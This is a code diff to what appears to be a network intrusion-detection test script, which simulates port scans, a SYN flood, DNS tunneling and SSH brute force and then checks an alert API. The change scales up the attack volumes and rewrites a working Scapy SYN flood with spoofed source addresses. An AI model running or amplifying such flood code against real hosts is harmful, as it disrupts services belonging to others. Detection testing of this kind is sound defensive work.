@@ -127,12 +127,12 @@ def scenario_port_scan(target, api_url, token):
     return wait_for_alerts(api_url, token, pre, timeout=60)
 
 
-def scenario_ddos(target, api_url, token, duration=10):
-    """SYN flood using Scapy."""
+def scenario_ddos(target, api_url, token, duration=15):
+    """SYN flood using Scapy — high volume for detection."""
     print_header("Scenario 2: DDoS SYN Flood", RED)
 
     try:
-        from scapy.all import IP, TCP, send, conf
+        from scapy.all import IP, TCP, Ether, sendp, conf, get_if_hwaddr
         conf.verb = 0
     except ImportError:
         print(f"  {RED}[ERROR] scapy not installed. pip install scapy{NC}")
@@ -140,26 +140,39 @@ def scenario_ddos(target, api_url, token, duration=10):
 
     pre = get_alert_count(api_url, token)
     print(f"  Pre-attack alerts: {pre}")
-    print(f"  Sending SYN flood to {target}:80 for {duration}s...")
+    print(f"  Sending SYN flood to {target}:80 for {duration}s (targeting 50K+ packets)...")
 
+    # Pre-build template for speed
     sent = 0
     start = time.time()
+    batch_size = 500  # Build and send in batches
+
     while time.time() - start < duration:
-        for _ in range(100):
-            pkt = IP(src=f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
-                     dst=target) / \
-                  TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
-            send(pkt, verbose=0)
-            sent += 1
+        pkts = []
+        for _ in range(batch_size):
+            src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            pkt = IP(src=src_ip, dst=target) / \
+                  TCP(sport=random.randint(1024, 65535), dport=80, flags="S",
+                      seq=random.randint(0, 4294967295))
+            pkts.append(pkt)
+
+        # Send batch — much faster than individual send()
+        from scapy.all import send as scapy_send
+        for p in pkts:
+            scapy_send(p, verbose=0)
+        sent += batch_size
+
+        elapsed = time.time() - start
+        rate = sent / max(elapsed, 0.1)
         if sent % 5000 == 0:
-            print(f"    Sent {sent} packets...")
+            print(f"    Sent {sent} packets ({rate:.0f}/s)...")
 
     print(f"  {GREEN}[+] {sent} SYN packets sent in {duration}s{NC}")
     return wait_for_alerts(api_url, token, pre, timeout=90)
 
 
-def scenario_dns_tunnel(target, api_url, token, num_queries=60):
-    """DNS tunneling using Scapy."""
+def scenario_dns_tunnel(target, api_url, token, num_queries=200):
+    """DNS tunneling using Scapy — higher volume for detection."""
     print_header("Scenario 3: DNS Tunneling", YELLOW)
 
     try:
@@ -188,8 +201,8 @@ def scenario_dns_tunnel(target, api_url, token, num_queries=60):
     return wait_for_alerts(api_url, token, pre, timeout=60)
 
 
-def scenario_brute_force(target, api_url, token, num_attempts=40):
-    """SSH brute force using Scapy."""
+def scenario_brute_force(target, api_url, token, num_attempts=200):
+    """SSH brute force using Scapy — higher volume for detection."""
     print_header("Scenario 4: SSH Brute Force", CYAN)
 
     try:
